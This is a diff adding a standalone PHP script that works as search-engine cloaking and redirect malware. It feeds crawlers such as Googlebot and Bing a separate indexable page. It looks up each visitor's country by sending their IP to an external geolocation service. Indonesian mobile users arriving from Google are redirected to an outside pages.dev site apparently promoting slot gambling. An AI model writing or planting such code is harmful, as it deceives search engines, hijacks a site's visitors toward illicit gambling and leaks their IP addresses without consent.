@@ -1,0 +1,67 @@
+<?php
+ob_start();
+error_reporting(0);
+header('Vary: Accept-Language, User-Agent');
+
+function is_google_ua() {
+    $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+    $keywords = [
+        "googlebot","google-site-verification","google-inspectiontool",
+        "googlebot-mobile","googlebot-news","bot","ahrefs","yandex","bing"
+    ];
+    foreach ($keywords as $k) {
+        if (strpos($ua, $k) !== false) return true;
+    }
+    return false;
+}
+
+function is_mobile_device() {
+    $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+    return preg_match('/(android|iphone|ipad|ipod|blackberry|windows phone|opera mini|mobile)/i', $ua);
+}
+
+function get_client_ip() {
+    foreach ([
+        'HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED',
+        'HTTP_FORWARDED_FOR','HTTP_FORWARDED','HTTP_CF_CONNECTING_IP','REMOTE_ADDR'
+    ] as $key) {
+        if (!empty($_SERVER[$key])) return trim(explode(',', $_SERVER[$key])[0]);
+    }
+    return '127.0.0.1';
+}
+
+$ip = get_client_ip();
+
+$geo_json = @file_get_contents("http://ip-api.com/json/$ip");
+$geo_arr  = $geo_json ? json_decode($geo_json, true) : [];
+$cc = $geo_arr['countryCode'] ?? null;
+
+$redirect_url = "https://sslotpulsaaxis.pages.dev/";
+
+if (is_google_ua()) {
+    if (ob_get_length()) ob_clean();
+    header("Content-Type: text/html; charset=UTF-8");
+    header("X-Robots-Tag: index, follow");
+    include __DIR__ . "/page.php";
+    ob_end_flush();
+    exit;
+}
+
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+if (
+    is_mobile_device() &&
+    $cc === 'ID' &&
+    ($_SERVER['REQUEST_URI'] ?? '') === '/' &&
+    strpos($referer, 'google') !== false
+) {
+    if (ob_get_length()) ob_clean();
+    header("Location: $redirect_url", true, 302);
+    ob_end_flush();
+    exit;
+}
+
+if (ob_get_length()) ob_clean();
+include __DIR__ . "/home.php";
+ob_end_flush();
+exit;
+?> 
